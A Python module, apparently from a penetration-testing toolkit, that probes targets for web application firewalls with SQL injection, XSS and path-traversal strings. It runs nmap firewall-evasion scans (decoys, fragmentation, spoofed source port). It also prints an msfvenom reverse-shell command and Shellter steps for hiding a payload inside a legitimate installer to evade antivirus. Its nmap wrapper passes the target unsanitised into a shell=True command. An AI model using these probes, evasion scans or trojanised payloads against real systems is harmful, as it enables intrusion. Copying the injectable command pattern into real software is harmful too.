"""
AV/Firewall Detection Scanner
Provides antivirus and firewall detection capabilities
"""

import socket
import subprocess
import logging
from typing import Dict, List, Optional, Any
import requests
import time

logger = logging.getLogger(__name__)

class AVFirewallScanner:
    """AV and Firewall detection scanner"""
    
    def __init__(self):
        self.timeout = 30
        
    def detect_waf(self, target: str, port: int = 80) -> Dict[str, Any]:
        """Detect Web Application Firewall"""
        results = {
            'target': target,
            'port': port,
            'waf_detected': False,
            'waf_type': None,
            'indicators': [],
            'error': None
        }
        
        try:
            # Test basic HTTP request
            url = f"http://{target}:{port}"
            if port == 443:
                url = f"https://{target}:{port}"
            
            # Send test requests to detect WAF
            test_payloads = [
                "/?id=1'",  # SQL injection test
                "/?q=<script>alert(1)</script>",  # XSS test
                "/?file=../../../etc/passwd",  # Path traversal test
            ]
            
            for payload in test_payloads:
                try:
                    response = requests.get(url + payload, timeout=10, verify=False)
                    
                    # Check response headers for WAF indicators
                    waf_headers = {
                        'cloudflare': ['cf-ray', 'cloudflare'],
                        'akamai': ['akamai', 'x-akamai'],
                        'aws-waf': ['x-amzn-requestid', 'x-amz-cf-id'],
                        'f5-bigip': ['f5-bigip', 'x-waf-event'],
                        'imperva': ['x-iinfo', 'incap_ses'],
                        'sucuri': ['x-sucuri-id', 'sucuri'],
                        'barracuda': ['barra', 'x-barracuda'],
                        'fortinet': ['fortigate', 'x-fw']
                    }
                    
                    for waf_name, indicators in waf_headers.items():
                        for indicator in indicators:
                            for header, value in response.headers.items():
                                if indicator.lower() in header.lower() or indicator.lower() in value.lower():
                                    results['waf_detected'] = True
                                    results['waf_type'] = waf_name
                                    results['indicators'].append(f"Header: {header}: {value}")
                    
                    # Check response body for WAF indicators
                    if response.status_code in [403, 406, 429, 501, 503]:
                        waf_body_indicators = [
                            'blocked', 'forbidden', 'access denied', 'security',
                            'firewall', 'waf', 'protection', 'threat'
                        ]
                        
                        for indicator in waf_body_indicators:
                            if indicator in response.text.lower():
                                results['waf_detected'] = True
                                results['indicators'].append(f"Body contains: {indicator}")
                                break
                    
                    if results['waf_detected']:
                        break
                        
                except requests.RequestException:
                    continue
                    
        except Exception as e:
            results['error'] = str(e)
            logger.error(f"WAF detection error for {target}:{port} - {e}")
            
        return results
    
    def detect_firewall_nmap(self, target: str) -> Dict[str, Any]:
        """Detect firewall using nmap techniques"""
        results = {
            'target': target,
            'firewall_detected': False,
            'scan_techniques': {},
            'filtered_ports': [],
            'error': None
        }
        
        try:
            # Check if nmap is available
            if not self._check_nmap_available():
                results['error'] = "nmap not available"
                return results
            
            # ACK scan to detect firewall
            ack_result = self._run_nmap_scan(target, "-sA -p 80,443,22,21,25")
            results['scan_techniques']['ack_scan'] = ack_result
            
            # SYN scan for comparison
            syn_result = self._run_nmap_scan(target, "-sS -p 80,443,22,21,25")
            results['scan_techniques']['syn_scan'] = syn_result
            
            # Parse results for firewall indicators
            if ack_result and 'filtered' in ack_result:
                results['firewall_detected'] = True
                results['filtered_ports'] = self._extract_filtered_ports(ack_result)
            
        except Exception as e:
            results['error'] = str(e)
            logger.error(f"Firewall detection error for {target} - {e}")
            
        return results
    
    def firewall_evasion_scan(self, target: str) -> Dict[str, Any]:
        """Test firewall evasion techniques"""
        results = {
            'target': target,
            'evasion_techniques': {},
            'successful_techniques': [],
            'error': None
        }
        
        try:
            if not self._check_nmap_available():
                results['error'] = "nmap not available"
                return results
            
            # Test different evasion techniques
            techniques = {
                'fragmentation': '-f',
                'decoy': '-D RND:10',
                'source_port': '--source-port 53',
                'timing': '-T1',
                'fin_scan': '-sF',
                'null_scan': '-sN',
                'xmas_scan': '-sX'
            }
            
            for technique_name, nmap_args in techniques.items():
                try:
                    result = self._run_nmap_scan(target, f"{nmap_args} -p 80,443")
                    results['evasion_techniques'][technique_name] = result
                    
                    # Check if technique was successful (found open ports)
                    if result and 'open' in result:
                        results['successful_techniques'].append(technique_name)
                        
                except Exception as e:
                    results['evasion_techniques'][technique_name] = f"Error: {str(e)}"
                    
        except Exception as e:
            results['error'] = str(e)
            logger.error(f"Evasion scan error for {target} - {e}")
            
        return results
    
    def generate_av_test_payload(self, payload_type: str = "msfvenom") -> Dict[str, Any]:
        """Generate test payload for AV detection"""
        results = {
            'payload_type': payload_type,
            'command': None,
            'instructions': [],
            'virustotal_url': 'https://www.virustotal.com/#/home/upload',
            'error': None
        }
        
        try:
            if payload_type == "msfvenom":
                # Generate msfvenom command
                results['command'] = "msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxx -f exe > binary.exe"
                results['instructions'] = [
                    "1. Replace x.x.x.x with your IP address",
                    "2. Replace xxx with your desired port",
                    "3. Run the command to generate binary.exe",
                    "4. Upload binary.exe to VirusTotal for AV detection testing"
                ]
            elif payload_type == "shellter":
                results['instructions'] = [
                    "1. Launch shellter from Kali Linux",
                    "2. Choose Auto mode",
                    "3. Select target executable (e.g., SpotifySetup.exe)",
                    "4. Enable Stealth Mode: Y",
                    "5. Use a listed payload: L",
                    "6. Select appropriate payload",
                    "7. Test generated payload against AV solutions"
                ]
            
        except Exception as e:
            results['error'] = str(e)
            logger.error(f"Payload generation error - {e}")
            
        return results
    
    def _check_nmap_available(self) -> bool:
        """Check if nmap is available"""
        try:
            result = subprocess.run(['nmap', '--version'], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def _run_nmap_scan(self, target: str, args: str) -> Optional[str]:
        """Run nmap scan with specified arguments"""
        try:
            cmd = f"nmap {args} {target}"
            result = subprocess.run(cmd, shell=True, capture_output=True, 
                                  text=True, timeout=self.timeout)
            
            if result.returncode == 0:
                return result.stdout
            else:
                return result.stderr or "Scan failed"
                
        except subprocess.TimeoutExpired:
            return "Scan timeout"
        except Exception as e:
            logger.error(f"Nmap scan error: {e}")
            return f"Error: {str(e)}"
    
    def _extract_filtered_ports(self, nmap_output: str) -> List[str]:
        """Extract filtered ports from nmap output"""
        filtered_ports = []
        lines = nmap_output.split('\n')
        
        for line in lines:
            if 'filtered' in line.lower():
                # Extract port number from line
                parts = line.split()
                if parts and '/' in parts[0]:
                    port = parts[0].split('/')[0]
                    filtered_ports.append(port)
        
        return filtered_ports

# Global scanner instance
av_firewall_scanner = AVFirewallScanner()